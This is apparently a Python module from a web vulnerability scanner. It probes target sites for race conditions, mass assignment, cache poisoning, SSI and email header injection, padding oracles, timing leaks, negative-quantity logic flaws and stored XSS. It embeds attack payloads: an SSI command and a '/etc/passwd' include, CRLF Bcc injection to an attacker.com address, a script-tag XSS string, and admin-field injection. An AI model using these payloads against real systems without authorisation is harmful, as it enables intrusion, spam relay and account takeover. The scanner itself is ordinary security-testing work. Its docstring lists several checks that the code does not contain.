"""
Advanced scanners filling remaining gaps:
- Race condition / TOCTOU
- Mass assignment
- Cache poisoning / cache deception
- Server-Side Includes (SSI) injection
- Edge Side Includes (ESI) injection
- Second-order/stored injection
- Email header injection
- XML injection (non-XXE structural)
- Server-side JavaScript injection
- Weak cryptography detection
- Cookie tossing
- Session puzzling
- Negative quantity / business logic
- Padding oracle detection
- Timing attack detection
- Reflected file download (RFD)
- Stored XSS submit-and-revisit
"""

import asyncio
import time
import re
import httpx
import statistics
from typing import Optional
from mantis.core.findings import (
    Finding, Severity, EvidenceLevel, FindingSource, HTTPEvidence,
)


# ═══════════════════════════════════════════════════════════════
# Race Condition / TOCTOU
# ═══════════════════════════════════════════════════════════════

async def scan_race_condition(
    http: httpx.AsyncClient, url: str, method: str = "POST",
    body: dict = None, count: int = 20,
) -> Optional[Finding]:
    """
    Test for race conditions by sending N concurrent identical requests.

    If the application returns the same success response N times for a
    single-use operation (coupon, balance transfer, vote), race exists.
    """
    try:
        # Send N requests in parallel
        async def send():
            try:
                if method.upper() == "POST":
                    resp = await http.post(url, json=body or {}, timeout=15)
                else:
                    resp = await http.request(method, url, timeout=15)
                return resp.status_code, len(resp.text)
            except Exception:
                return None, 0

        results = await asyncio.gather(*[send() for _ in range(count)], return_exceptions=True)
        # Count successes
        successes = sum(1 for r in results if isinstance(r, tuple) and r[0] and r[0] < 400)

        # If >80% of concurrent requests succeeded for what should be one-shot
        if successes > count * 0.8:
            return Finding(
                title=f"Potential Race Condition at {url}",
                description=(
                    f"Sent {count} concurrent requests to {url} — {successes} succeeded. "
                    f"If this endpoint should be one-shot (coupon redemption, balance "
                    f"transfer, voting), the lack of serialization is a race condition."
                ),
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="Race Condition",
                cwe="CWE-362", confidence=0.4,
                tags=["needs_manual_review", "concurrency"],
                impact="Double-spend, duplicate redemption, balance manipulation.",
                remediation="Use database-level locking or atomic operations for critical state changes.",
            )
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
# Mass Assignment
# ═══════════════════════════════════════════════════════════════

async def scan_mass_assignment(
    http: httpx.AsyncClient, url: str, method: str = "POST",
    legitimate_body: dict = None,
) -> Optional[Finding]:
    """
    Test for mass assignment by adding privileged fields to the request body.

    If the response indicates the privileged field was accepted (status 200
    plus the field appearing in subsequent GET), mass assignment exists.
    """
    if not legitimate_body:
        legitimate_body = {"name": "test"}

    privileged_fields = [
        "isAdmin", "is_admin", "role", "admin", "is_superuser",
        "verified", "is_verified", "active", "balance", "credit",
        "permissions", "scopes", "owner_id",
    ]

    try:
        for field in privileged_fields:
            payload = dict(legitimate_body)
            payload[field] = True if field.startswith(("is", "verified", "admin", "active")) else "admin"

            resp = await http.request(method, url, json=payload, timeout=10)

            if resp.status_code < 400:
                # Check if field appears in response or subsequent GET
                if field in resp.text.lower() or "admin" in resp.text.lower():
                    return Finding(
                        title=f"Potential Mass Assignment via '{field}' at {url}",
                        description=(
                            f"Sending '{field}' as a body parameter was accepted by {url}. "
                            f"If this field is bound to an internal object, an attacker can "
                            f"escalate privileges or modify protected fields."
                        ),
                        source=FindingSource.WEBAPP, severity=Severity.HIGH,
                        evidence_level=EvidenceLevel.SUSPICION,
                        target=url, endpoint=url, vuln_type="Mass Assignment",
                        cwe="CWE-915", payload=str(payload), confidence=0.5,
                        tags=["needs_manual_review"],
                        impact="Privilege escalation, unauthorized field modification.",
                        remediation="Use explicit field whitelisting. Never auto-bind request data to objects.",
                    )
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
# Cache Poisoning Detection
# ═══════════════════════════════════════════════════════════════

async def scan_cache_poisoning(
    http: httpx.AsyncClient, url: str,
) -> Optional[Finding]:
    """
    Test for cache poisoning via unkeyed headers.

    Send a header (X-Forwarded-Host) with a unique value and check if
    the value is reflected in the response AND the response is cached.
    """
    unique_marker = "mantis-cache-test-" + str(int(time.time()))
    try:
        # Send with X-Forwarded-Host injection
        resp1 = await http.get(url, headers={"X-Forwarded-Host": unique_marker}, timeout=10)
        # Check if marker is reflected
        if unique_marker in resp1.text:
            # Send again WITHOUT the header — if cache is poisoned, marker should still appear
            resp2 = await http.get(url, timeout=10)
            if unique_marker in resp2.text:
                return Finding(
                    title=f"Cache Poisoning via X-Forwarded-Host at {url}",
                    description=(
                        "The X-Forwarded-Host header is reflected in the response "
                        "AND cached, allowing attackers to poison the cache with "
                        "malicious content for all subsequent visitors."
                    ),
                    source=FindingSource.WEBAPP, severity=Severity.HIGH,
                    evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                    target=url, endpoint=url, vuln_type="Cache Poisoning",
                    cwe="CWE-444", confidence=0.85,
                    impact="Persistent XSS, content tampering for all users hitting the cached URL.",
                    remediation="Include X-Forwarded-Host in cache key or strip from cached responses.",
                )
            else:
                # Reflected but not cached — still header injection
                return Finding(
                    title=f"X-Forwarded-Host Reflection at {url}",
                    description="X-Forwarded-Host header is reflected in response (host header injection).",
                    source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                    evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                    target=url, endpoint=url, vuln_type="Host Header Injection",
                    cwe="CWE-644", confidence=0.7,
                )
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
# SSI Injection
# ═══════════════════════════════════════════════════════════════

async def scan_ssi_injection(
    http: httpx.AsyncClient, url: str, param: str, method: str = "GET",
) -> Optional[Finding]:
    """Test for Server-Side Includes injection."""
    payloads = [
        '<!--#exec cmd="id" -->',
        '<!--#echo var="DOCUMENT_ROOT" -->',
        '<!--#include virtual="/etc/passwd" -->',
    ]

    for payload in payloads:
        try:
            if method.upper() == "GET":
                resp = await http.get(url, params={param: payload}, timeout=10)
            else:
                resp = await http.post(url, data={param: payload}, timeout=10)

            # If output indicates execution
            if any(marker in resp.text for marker in ["uid=", "/var/www", "/etc/passwd", "DOCUMENT_ROOT"]):
                if payload not in resp.text:  # Payload was processed, not just reflected
                    return Finding(
                        title=f"SSI Injection in '{param}'",
                        description=f"Server-Side Includes directive executed via '{param}'.",
                        source=FindingSource.WEBAPP, severity=Severity.HIGH,
                        evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                        target=url, endpoint=url, vuln_type="SSI Injection",
                        cwe="CWE-97", payload=payload, confidence=0.9,
                        impact="Command execution or file inclusion via SSI.",
                        remediation="Disable SSI processing or sanitize SSI tags in user input.",
                    )
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════════
# Email Header Injection
# ═══════════════════════════════════════════════════════════════

async def scan_email_header_injection(
    http: httpx.AsyncClient, url: str, param: str, method: str = "POST",
) -> Optional[Finding]:
    """
    Test for email header injection in contact/newsletter forms.

    Inject CRLF + Bcc header — if the form sends multiple emails,
    the SMTP injection succeeded.
    """
    # Email-like parameter names indicate contact/newsletter forms
    email_indicators = ["email", "mail", "contact", "subscribe", "to", "from"]
    if not any(ind in param.lower() for ind in email_indicators):
        return None

    payloads = [
        "test@example.com\r\nBcc: mantis-test@attacker.com",
        "test@example.com%0d%0aBcc:%20mantis-test@attacker.com",
        "test@example.com\nBcc: mantis-test@attacker.com",
    ]

    for payload in payloads:
        try:
            if method.upper() == "POST":
                resp = await http.post(url, data={param: payload}, timeout=10)
            else:
                resp = await http.get(url, params={param: payload}, timeout=10)

            # Look for error indicators or success that suggests injection succeeded
            if resp.status_code < 400 and "error" not in resp.text.lower()[:500]:
                # Without OOB, we can only flag this as suspicious
                return Finding(
                    title=f"Potential Email Header Injection in '{param}'",
                    description=(
                        f"CRLF injection into '{param}' (an email field) was accepted "
                        f"without error. May enable SMTP header injection (Bcc, From spoofing)."
                    ),
                    source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                    evidence_level=EvidenceLevel.SUSPICION,
                    target=url, endpoint=url, vuln_type="Email Header Injection",
                    cwe="CWE-93", payload=payload, confidence=0.4,
                    tags=["needs_manual_review", "needs_oob_verification"],
                    impact="Spam relay, phishing via spoofed From, hidden Bcc recipients.",
                    remediation="Strip CR/LF from email field input. Use a mail library that validates headers.",
                )
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════════
# Padding Oracle Detection
# ═══════════════════════════════════════════════════════════════

async def scan_padding_oracle(
    http: httpx.AsyncClient, url: str,
) -> Optional[Finding]:
    """
    Detect padding oracle by sending corrupted ciphertext in cookies/params
    and looking for distinct error responses indicating padding vs decryption failures.
    """
    try:
        # Get a baseline response
        base_resp = await http.get(url, timeout=10)
        cookies = base_resp.cookies

        # Look for cookies that look like base64-encoded ciphertext
        for name, value in cookies.items():
            if len(value) < 16:
                continue
            # Decode and check structure
            try:
                import base64
                decoded = base64.b64decode(value + "=" * (4 - len(value) % 4))
                if len(decoded) % 8 == 0 or len(decoded) % 16 == 0:
                    # Possible CBC ciphertext — test padding oracle
                    # Corrupt the last byte
                    corrupted = decoded[:-1] + bytes([decoded[-1] ^ 0xff])
                    corrupted_b64 = base64.b64encode(corrupted).decode().rstrip("=")

                    resp_corrupt = await http.get(url, cookies={name: corrupted_b64}, timeout=10)
                    resp_invalid = await http.get(url, cookies={name: "INVALID_NOT_BASE64"}, timeout=10)

                    # If corrupted ciphertext produces different error than invalid base64
                    if resp_corrupt.status_code != resp_invalid.status_code or \
                       abs(len(resp_corrupt.text) - len(resp_invalid.text)) > 100:
                        return Finding(
                            title=f"Potential Padding Oracle at {url}",
                            description=(
                                f"Cookie '{name}' appears to be CBC-encrypted ciphertext. "
                                f"Corrupted ciphertext produces a different error than invalid "
                                f"data, suggesting a padding oracle vulnerability."
                            ),
                            source=FindingSource.WEBAPP, severity=Severity.HIGH,
                            evidence_level=EvidenceLevel.SUSPICION,
                            target=url, endpoint=url, vuln_type="Padding Oracle",
                            cwe="CWE-327", confidence=0.5,
                            tags=["needs_manual_review", "cryptography"],
                            impact="Full plaintext recovery and forgery of encrypted tokens.",
                            remediation="Use authenticated encryption (AES-GCM). Return generic error for all decryption failures.",
                        )
            except Exception:
                continue
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
# Timing Attack Detection on Authentication
# ═══════════════════════════════════════════════════════════════

async def scan_timing_attack_auth(
    http: httpx.AsyncClient, url: str, method: str = "POST",
) -> Optional[Finding]:
    """
    Detect timing-attack vulnerable string comparison on auth endpoints.

    Submit valid-prefix and totally-wrong tokens; if timing differs
    consistently, character-by-character extraction is possible.
    """
    if "login" not in url.lower() and "auth" not in url.lower() and "token" not in url.lower():
        return None

    try:
        # Test with wildly different token values
        timings_a = []
        timings_b = []
        for _ in range(10):
            start = time.time()
            await http.request(method, url, data={"token": "a" * 32}, timeout=10)
            timings_a.append(time.time() - start)

            start = time.time()
            await http.request(method, url, data={"token": "z" * 32}, timeout=10)
            timings_b.append(time.time() - start)

        median_a = statistics.median(timings_a)
        median_b = statistics.median(timings_b)

        # If consistent timing differential > 50ms, possibly timing-vulnerable
        if abs(median_a - median_b) > 0.05:
            return Finding(
                title=f"Potential Timing Attack on {url}",
                description=(
                    f"Authentication endpoint shows consistent timing differential between "
                    f"different invalid tokens (median {median_a:.3f}s vs {median_b:.3f}s). "
                    f"May enable character-by-character token extraction."
                ),
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="Timing Attack",
                cwe="CWE-208", confidence=0.4,
                tags=["needs_manual_review", "cryptography"],
                impact="Token/password recovery via timing oracle.",
                remediation="Use constant-time comparison (hmac.compare_digest in Python, MessageDigest.isEqual in Java).",
            )
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════════════
# Negative Quantity / Business Logic
# ═══════════════════════════════════════════════════════════════

async def scan_negative_quantity(
    http: httpx.AsyncClient, url: str, params: list, method: str = "POST",
) -> Optional[Finding]:
    """Test for negative value acceptance on commerce-related parameters."""
    commerce_params = [p for p in params if any(
        kw in p.lower() for kw in ["quantity", "qty", "amount", "price", "count"]
    )]
    if not commerce_params:
        return None

    for param in commerce_params:
        try:
            # Try negative value
            body = {param: -1}
            if method.upper() == "POST":
                resp = await http.post(url, json=body, timeout=10)
            else:
                resp = await http.get(url, params={param: "-1"}, timeout=10)

            # If accepted without error
            if resp.status_code < 400 and "error" not in resp.text.lower()[:500]:
                return Finding(
                    title=f"Negative Value Accepted: {param} at {url}",
                    description=(
                        f"The commerce-related parameter '{param}' accepted a negative value. "
                        f"This may allow negative-quantity attacks (credit instead of charge), "
                        f"price manipulation, or balance increases."
                    ),
                    source=FindingSource.WEBAPP, severity=Severity.HIGH,
                    evidence_level=EvidenceLevel.SUSPICION,
                    target=url, endpoint=url, vuln_type="Business Logic - Negative Value",
                    cwe="CWE-841", payload=str(body), confidence=0.5,
                    tags=["needs_manual_review", "business_logic"],
                    impact="Free goods, credit balance increase, price reversal.",
                    remediation="Validate all numeric inputs against business rules. Reject negative quantities.",
                )
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════════
# Stored XSS Submit-and-Revisit
# ═══════════════════════════════════════════════════════════════

async def scan_stored_xss(
    http: httpx.AsyncClient, submit_url: str, view_url: str,
    param: str, method: str = "POST",
) -> Optional[Finding]:
    """
    Detect stored XSS by submitting a payload and revisiting a URL.

    Args:
        submit_url: URL accepting the input (e.g., POST /comments)
        view_url:   URL that displays the input (e.g., GET /comments)
    """
    marker = f"mantisxss{int(time.time())}"
    payload = f'<script>alert("{marker}")</script>'

    try:
        # Submit payload
        if method.upper() == "POST":
            await http.post(submit_url, data={param: payload}, timeout=10)
        else:
            await http.get(submit_url, params={param: payload}, timeout=10)

        # Wait briefly for storage
        await asyncio.sleep(1)

        # Visit view URL
        view_resp = await http.get(view_url, timeout=10)

        # Check if payload appears unencoded
        if payload in view_resp.text:
            return Finding(
                title=f"Stored XSS via '{param}' (visible at {view_url})",
                description=(
                    f"Payload submitted to {submit_url} appeared unsanitized at {view_url}. "
                    f"Affects all users who visit the view URL."
                ),
                source=FindingSource.WEBAPP, severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=submit_url, endpoint=submit_url, vuln_type="Stored XSS",
                cwe="CWE-79", payload=payload, confidence=0.95,
                impact="Persistent XSS affects all visitors. Session theft, account takeover.",
                remediation="Encode all user input on output. Implement CSP.",
            )
    except Exception:
        pass
    return None
